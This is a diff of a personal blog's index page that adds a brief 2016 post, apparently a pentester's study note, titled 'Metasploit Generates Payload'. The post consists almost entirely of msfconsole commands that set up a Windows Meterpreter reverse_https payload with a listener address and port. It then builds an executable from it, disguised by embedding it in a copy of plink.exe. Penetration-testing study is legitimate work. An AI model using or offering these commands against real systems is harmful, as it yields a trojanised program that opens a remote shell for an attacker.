@@ -9,7 +9,14 @@
 
 <meta name="author" content="Bob1Bob2"> 
 
-<meta name="description" content="Web for Pentester: This exercise is a set of the most common web vulnerability Difficluty: 1/5 Read more 2016-02-20 16:14:10 -0600 pentesterlab, sql &hellip;"> <meta name="keywords" content="">
+<meta name="description" content="This note is for generating payload using Metasploit. Use generate command: 1
+2
+3
+4
+5
+6
+7
+msf &gt; use payload/windows/meterpreter/reverse_https msf &hellip;"> <meta name="keywords" content="">
 
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -97,6 +104,68 @@ $(document).ready(
 </header>
 
 	<div id="content" class="inner">
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2016/02/26/metasploit-generates-payload/">
+		
+			Metasploit Generates Payload</a>
+	</h2>
+	<div class="entry-content">
+		<h3>This note is for generating payload using Metasploit.</h3>
+
+<h3>Use <code>generate</code> command:</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use payload/windows/meterpreter/reverse_https
+</span><span class='line'>
+</span><span class='line'>msf payload(reverse_https) &gt; set lhost 192.168.79.156
+</span><span class='line'>
+</span><span class='line'>msf payload(reverse_https) &gt; set lport 4444
+</span><span class='line'>
+</span><span class='line'>msf payload(reverse_https) &gt; generate -t exe -f false.exe -x /var/www/html/plink.exe
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+		
+		<a href="/blog/2016/02/26/metasploit-generates-payload/" class="more-link">Read more</a>
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-02-26T15:47:27-06:00" pubdate data-updated="true">2016-02-26 15:47:27 -0600</time></div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/metasploit/'>metasploit</a>, <a class='category' href='/blog/categories/payload/'>payload</a>
+
+</div>
+
+
+	
+</div></article>
 
 
     <article class="post">
